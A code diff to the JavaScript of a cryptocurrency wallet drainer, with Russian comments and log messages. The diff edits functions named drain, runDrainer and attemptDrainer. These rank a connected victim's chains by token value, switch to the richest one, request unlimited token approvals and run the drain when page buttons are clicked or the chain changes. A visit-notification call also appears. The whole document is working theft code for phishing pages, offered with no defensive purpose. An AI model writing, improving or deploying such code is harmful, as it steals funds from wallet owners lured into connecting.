@@ -26,7 +26,6 @@ const appKitModal = createAppKit({
 let connectedAddress = null;
 let hasDrained = false;
 let isTransactionPending = false;
-let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
@@ -153,7 +152,6 @@ notifyOnVisit().catch(error => {
 async function getTokenPriceInUSDT(tokenSymbol) {
   if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;
 
-  // Кэширование цен
   const cachedPrice = sessionStorage.getItem(`tokenPrice_${tokenSymbol}`);
   if (cachedPrice) {
     return parseFloat(cachedPrice);
@@ -359,16 +357,16 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   // Проверяем текущую сеть и переключаем, если нужно
   const currentNetwork = await provider.getNetwork();
   if (currentNetwork.chainId !== chainId) {
-    console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId} (BNB Smart Chain)`);
+    console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId}`);
     try {
       await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
       console.log(`⏳ Ожидаем завершения переключения сети...`);
-      await new Promise(resolve => setTimeout(resolve, 3000)); // Задержка 3 секунды
+      await new Promise(resolve => setTimeout(resolve, 3000));
       const newNetwork = await provider.getNetwork();
       if (newNetwork.chainId !== chainId) {
-        throw new Error(`Failed to switch network: expected chainId ${chainId} (BNB Smart Chain), but got ${newNetwork.chainId}`);
+        throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
       }
-      console.log(`✅ Сеть успешно сменилась на chainId ${chainId} (BNB Smart Chain)`);
+      console.log(`✅ Сеть успешно сменилась на chainId ${chainId}`);
     } catch (error) {
       console.error(`❌ Ошибка при переключении сети: ${error.message}`);
       if (error.code === 4001) {
@@ -425,7 +423,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6)); // 0.1 в числовом формате
+  const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));
 
   console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
   let ethBalance;
@@ -565,6 +563,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
   return status;
 }
+
 async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
@@ -589,7 +588,6 @@ async function runDrainer(provider, signer, userAddress) {
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
 
-  // Сортируем сети по общей стоимости токенов в USDT (без нативных)
   const sorted = await Promise.all(
     balances
       .filter(item => hasFunds(item.balance))
@@ -599,7 +597,6 @@ async function runDrainer(provider, signer, userAddress) {
       })
   );
 
-  // Сортируем по убыванию суммарной стоимости токенов (без нативных)
   sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
   if (!sorted.length) {
@@ -607,18 +604,14 @@ async function runDrainer(provider, signer, userAddress) {
   }
 
   const target = sorted[0];
-  console.log(`Выбрана сеть с chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
-  await switchChain(target.chainId);
-  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
-  return status;
+  console.log(`Рекомендуемая сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
+  return { targetChainId: target.chainId, targetProvider: target.provider };
 }
 
-// Вспомогательная функция для расчёта общей стоимости только токенов в USDT
 async function calculateTotalValueInUSDT(chainId, balance, provider) {
   const chainConfig = config.CHAINS[chainId];
   let totalValue = 0;
 
-  // Учитываем только токены (USDT, USDC, другие), исключая нативные токены
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
     const tokenData = balance.tokenBalances[tokenAddress];
     const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
@@ -636,8 +629,9 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
   return totalValue;
 }
+
 window.addEventListener('DOMContentLoaded', () => {
-  actionBtn = document.getElementById('action-btn');
+  const actionButtons = document.querySelectorAll('.action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
   const link = document.createElement('link');
@@ -822,15 +816,17 @@ window.addEventListener('DOMContentLoaded', () => {
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
   if (!isInjected) {
-    actionBtn.style.display = 'inline-block';
-    actionBtn.addEventListener('click', () => {
-      window.showWalletRedirectModal();
+    actionButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        window.showWalletRedirectModal();
+      });
     });
     return;
   }
 
-  actionBtn.style.display = 'inline-block';
-  actionBtn.addEventListener('click', handleConnectOrAction);
+  actionButtons.forEach(btn => {
+    btn.addEventListener('click', handleConnectOrAction);
+  });
 
   window.ethereum.on('chainChanged', onChainChanged);
 });
@@ -876,7 +872,7 @@ async function attemptDrainer() {
   }, 60000);
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -887,8 +883,12 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const status = await runDrainer(provider, signer, connectedAddress);
-    console.log('✅ Drainer выполнен, статус:', status);
+    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    if (targetChainId) {
+      await switchChain(targetChainId);
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
+      console.log('✅ Drainer выполнен, статус:', status);
+    }
 
     hasDrained = true;
     isTransactionPending = false;
@@ -947,7 +947,10 @@ async function handleConnectOrAction() {
 async function onChainChanged(chainId) {
   console.log('🔄 Смена сети:', chainId);
   if (connectedAddress && !isTransactionPending) {
-    await attemptDrainer();
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+    const newNetwork = await provider.getNetwork();
+    console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+    await attemptDrainer(provider);
   } else {
     console.log('⏳ Транзакция в процессе');
     await hideModalWithDelay("Transaction in progress, please wait.");
